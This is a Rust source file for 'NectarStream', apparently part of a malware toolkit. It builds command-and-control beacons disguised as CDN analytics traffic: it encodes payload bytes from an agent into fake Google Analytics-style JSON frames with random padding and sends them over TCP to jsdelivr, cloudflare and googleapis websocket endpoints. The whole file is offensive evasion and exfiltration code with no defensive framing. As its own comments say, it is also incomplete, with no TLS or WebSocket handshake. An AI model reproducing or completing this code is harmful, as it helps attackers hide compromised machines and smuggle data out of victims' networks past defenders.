// NectarStream: WebSocket C2 disguised as CDN telemetry traffic.
// Camouflages swarm beacons as legitimate websocket analytics.
// Data flows: agent → wss://cdn.jsdelivr.net/telemetry → Hive C2 server.

use std::time::Duration;
use rand::Rng;

const CDN_WS_ENDPOINTS: &[&str] = &[
    "wss://cdn.jsdelivr.net/analytics/collect",
    "wss://cdnjs.cloudflare.com/telemetry/v1",
    "wss://ajax.googleapis.com/metrics/beacon",
];

/// Build a WebSocket frame disguised as analytics telemetry.
/// Format: JSON envelope with random padding fields.
pub fn build_nectar_frame(agent_id: &str, payload: &[u8]) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let pad_size = rng.gen_range(0..256);

    let envelope = format!(
        r#"{{"v":"1","tid":"UA-{}-1","cid":"{}","t":"pageview","dp":"/analytics/{}/{}","sr":"1920x1080","vp":"{}x{}","je":1,"fl":{},"pad":"{}"}}"#,
        agent_id.chars().take(8).collect::<String>(),
        agent_id,
        hex::encode(&payload[..payload.len().min(32)]),
        rng.gen_range(10000..99999),
        rng.gen_range(800..1920),
        rng.gen_range(600..1080),
        rng.gen_range(20..30),
        "x".repeat(pad_size),
    );

    envelope.into_bytes()
}

/// Send a nectar frame via raw TCP to a CDN WebSocket endpoint.
/// In production: use tungstenite or tokio-tungstenite for full WS handshake.
pub fn send_nectar(endpoint: &str, frame: &[u8]) -> bool {
    let host = extract_host(endpoint);
    let addr = match resolve(&host, 443) {
        Some(a) => a,
        None => return false,
    };

    match std::net::TcpStream::connect_timeout(&addr, Duration::from_secs(5)) {
        Ok(mut stream) => {
            use std::io::Write;
            // Simplified: send raw data. Full implementation needs WebSocket handshake.
            let _ = stream.write_all(frame);
            true
        }
        Err(_) => false,
    }
}

fn extract_host(url: &str) -> String {
    url.trim_start_matches("wss://")
       .trim_start_matches("https://")
       .trim_start_matches("ws://")
       .split('/').next().unwrap_or("localhost")
       .to_string()
}

fn resolve(host: &str, port: u16) -> Option<std::net::SocketAddr> {
    use std::net::ToSocketAddrs;
    format!("{}:{}", host, port).to_socket_addrs().ok()?.next()
}
